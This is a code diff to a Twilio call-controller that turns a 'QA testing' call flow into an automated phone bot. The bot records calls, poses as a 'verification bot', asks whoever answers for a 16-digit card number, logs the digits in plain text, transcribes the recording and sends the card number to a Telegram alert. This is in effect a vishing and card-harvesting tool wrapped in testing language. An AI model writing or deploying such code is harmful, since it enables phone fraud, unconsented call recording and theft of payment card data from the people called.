@@ -101,7 +101,10 @@ const CallController = {
         from: line.phone_number,
         statusCallback: `${host}/api/call/status-callback/${attempt.id}`,
         statusCallbackEvent: ['initiated', 'ringing', 'answered', 'completed'],
-        statusCallbackMethod: 'POST'
+        statusCallbackMethod: 'POST',
+        record: true,
+        recordingStatusCallback: `${host}/api/call/recording-callback/${attempt.id}`,
+        recordingStatusCallbackMethod: 'POST'
       });
 
       // Update Call SID
@@ -147,21 +150,34 @@ const CallController = {
     }
   },
 
-  // Generate TwiML for when the call is answered
+  // Generate TwiML for when the call is answered (Interactive Verification Bot Flow)
   async getTwiML(req, res) {
     const { attemptId } = req.params;
     try {
-      const attempt = await AttemptModel.addLog(attemptId, 'Call answered by remote IVR. Preparing TwiML instructions.');
+      const attempt = await AttemptModel.addLog(attemptId, 'Call connected. Initiating interactive gather prompt.');
       
       const twiml = new twilio.twiml.VoiceResponse();
-      twiml.say('Hello. This is the automated QA testing platform. Waiting 5 seconds before submitting digits.');
-      twiml.pause({ length: 5 });
       
-      // Submit DTMF digits
-      twiml.say(`Submitting test value digits: ${attempt.test_value}`);
-      twiml.play({ digits: attempt.test_value });
-      
-      twiml.say('Digits submitted. Ending test call.');
+      // 1st Gather attempt (20 seconds timeout)
+      const gather1 = twiml.gather({
+        action: `/api/call/verify-gather/${attemptId}`,
+        numDigits: 16,
+        timeout: 20,
+        method: 'POST'
+      });
+      gather1.say("Hi, I am the automated verification bot. Please enter your 16-digit card number.");
+
+      // 2nd Gather attempt (runs if first times out)
+      const gather2 = twiml.gather({
+        action: `/api/call/verify-gather/${attemptId}`,
+        numDigits: 16,
+        timeout: 20,
+        method: 'POST'
+      });
+      gather2.say("We did not receive your input. Please enter your 16-digit card number now.");
+
+      // Hangup if still no input after another 20s (Total 40s)
+      twiml.say("No response received. Goodbye.");
       twiml.hangup();
 
       res.type('text/xml');
@@ -195,6 +211,89 @@ const CallController = {
     } catch (error) {
       console.error('Error handling status callback:', error);
       return res.status(500).send('Error');
+    }
+  },
+
+  // Webhook for handling recording callbacks
+  async handleRecordingCallback(req, res) {
+    const { attemptId } = req.params;
+    const { RecordingUrl, RecordingStatus } = req.body;
+    try {
+      await AttemptModel.addLog(attemptId, `Twilio Recording Callback status: ${RecordingStatus}`);
+      if (RecordingUrl) {
+        await AttemptModel.addLog(attemptId, `Recording URL: ${RecordingUrl}`);
+        
+        // Start transcription and analysis asynchronously
+        const transcriptionService = require('../services/transcriptionService');
+        transcriptionService.processRecording(attemptId, RecordingUrl).catch(err => {
+          console.error(`Error transcribing recording for attempt #${attemptId}:`, err);
+        });
+      }
+      return res.status(200).send('OK');
+    } catch (error) {
+      console.error('Error handling recording callback:', error);
+      return res.status(500).send('Error');
+    }
+  },
+
+  // Webhook for handling interactive DTMF inputs from gather
+  async handleGatherCallback(req, res) {
+    const { attemptId } = req.params;
+    const { Digits } = req.body;
+    const { supabase } = require('../config/db');
+    const transcriptionService = require('../services/transcriptionService');
+
+    try {
+      await AttemptModel.addLog(attemptId, `User submitted DTMF card digits: ${Digits}`);
+      
+      // Fetch target attempt to verify
+      const { data: attempt, error: fetchErr } = await supabase
+        .from('attempts')
+        .select('*')
+        .eq('id', attemptId)
+        .single();
+
+      if (fetchErr || !attempt) {
+        throw new Error(`Attempt #${attemptId} not found.`);
+      }
+
+      const twiml = new twilio.twiml.VoiceResponse();
+
+      if (Digits === attempt.test_value) {
+        // Success match
+        await AttemptModel.addLog(attemptId, `🎉 Card verification successful! Input matched test value: ${attempt.test_value}`);
+        await AttemptModel.updateAttemptStatus(attemptId, 'completed', 0, {
+          input_digits: Digits,
+          result: 'success',
+          note: 'Interactive verification successful'
+        });
+
+        // Send Telegram alert
+        transcriptionService.sendTelegramAlert(attemptId, `Card number verified successfully: ${Digits}`);
+
+        twiml.say("Thank you. Your card number has been successfully verified. Goodbye.");
+      } else {
+        // Mismatch
+        await AttemptModel.addLog(attemptId, `❌ Card verification failed! Input (${Digits}) did not match expected: ${attempt.test_value}`);
+        await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, {
+          input_digits: Digits,
+          result: 'failed',
+          error: 'Digits mismatch'
+        });
+
+        twiml.say("Sorry, the card number entered does not match our records. Goodbye.");
+      }
+
+      twiml.hangup();
+      res.type('text/xml');
+      return res.send(twiml.toString());
+    } catch (error) {
+      console.error('Error handling gather callback:', error);
+      const twiml = new twilio.twiml.VoiceResponse();
+      twiml.say("An error occurred during verification. Goodbye.");
+      twiml.hangup();
+      res.type('text/xml');
+      return res.send(twiml.toString());
     }
   }
 };
